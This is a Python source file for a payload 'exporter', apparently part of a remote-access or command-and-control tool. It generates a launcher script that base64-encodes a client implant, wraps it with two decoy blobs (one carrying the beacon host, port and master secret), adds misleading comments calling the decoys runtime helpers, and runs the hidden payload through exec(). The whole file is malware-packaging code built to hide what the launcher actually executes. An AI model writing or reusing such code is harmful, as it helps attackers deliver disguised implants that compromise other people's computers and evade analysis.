"""Python launcher exporter with payload integrity + decoys.

Uses shared helpers from exporter.payload_prep to produce a single-file
payload with three blobs (actual, decoy1, decoy2) and a UUID check.
"""

from core.config import Config
from exporter.base_exporter import BaseExporter
from exporter.payload_prep import (
    build_decoy1,
    build_decoy2,
    prepare_payload,
)


class PyExporter(BaseExporter):
    format_name = "py"
    extension = ".py"

    def __init__(self, chunk_size=None, beacon_host=None, beacon_port=None):
        kwargs = {}
        if chunk_size is not None:
            kwargs["chunk_size"] = chunk_size
        super().__init__(**kwargs)

        cfg = Config()
        self.beacon_host = beacon_host if beacon_host is not None else cfg.host
        self.beacon_port = beacon_port if beacon_port is not None else cfg.port
        self._master_secret = cfg.auth_secret

    def export(self, client_source: str) -> str:
        uuid, prepared = prepare_payload(client_source)
        actual = self.payload_literal(prepared)
        decoy1 = self.payload_literal(build_decoy1())
        decoy2 = self.payload_literal(
            build_decoy2(self.beacon_host, self.beacon_port, self._master_secret),
        )

        return (
            "#!/usr/bin/env python3\n"
            "# Auto-generated payload launcher.\n"
            "import base64 as _b64\n\n"
            f"_RSC_UUID = {uuid!r}\n"
            "_RSC_LAUNCHED = True\n\n"
            "_ACTUAL_B64 = (\n"
            f"{actual}\n"
            ")\n\n"
            "_DECOY1_B64 = (\n"
            f"{decoy1}\n"
            ")\n\n"
            "_DECOY2_B64 = (\n"
            f"{decoy2}\n"
            ")\n\n"
            "# Internal runtime helpers — bootstrap protocol requires these\n"
            "# to be present. Absence is non-fatal (see try/except below).\n"
            "try:\n"
            "    _RSC_LOADER = _b64.b64decode(_DECOY1_B64)\n"
            "    _RSC_DIAG = _b64.b64decode(_DECOY2_B64)\n"
            "except Exception:\n"
            "    _RSC_LOADER = b''\n"
            "    _RSC_DIAG = b''\n\n"
            "exec(compile(_b64.b64decode(_ACTUAL_B64), '<payload>', 'exec'))\n"
        )
